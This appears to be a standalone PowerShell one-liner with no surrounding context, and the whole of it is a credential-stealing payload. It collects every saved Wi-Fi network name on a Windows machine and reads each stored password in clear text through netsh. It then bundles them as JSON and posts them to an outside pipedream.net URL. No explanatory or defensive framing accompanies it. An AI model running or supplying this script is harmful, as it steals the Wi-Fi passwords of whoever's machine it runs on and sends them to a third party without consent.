$wifiData = (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object { $ssid = ($_ -split ':')[1].Trim(); $pass = (netsh wlan show profile name=\"$ssid\" key=clear | Select-String 'Key Content') -replace '.*Key Content *: ', ''; @{SSID=$ssid;Password=$pass} } | ConvertTo-Json -Depth 2; Invoke-RestMethod -Uri 'https://eona10ajqr1vxdw.m.pipedream.net' -Method Post -Body $wifiData -ContentType 'application/json'
